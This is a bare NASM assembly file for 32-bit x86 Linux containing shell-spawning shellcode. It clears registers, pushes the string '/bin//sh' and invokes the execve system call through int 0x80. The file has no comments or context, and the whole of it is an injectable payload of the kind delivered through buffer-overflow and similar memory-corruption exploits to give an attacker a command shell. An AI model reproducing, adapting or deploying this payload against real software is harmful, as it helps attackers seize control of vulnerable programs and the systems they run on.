	[BITS 32]


	global _start

_start:
	sub esp,0x7f
	xor eax,eax
	xor ecx,ecx
	xor edx,edx

	push eax
	push "//sh"
	push "/bin"

	push esp
	pop ebx

	push esp
	pop ebp

	mov al,0x0b
	int 0x80

	
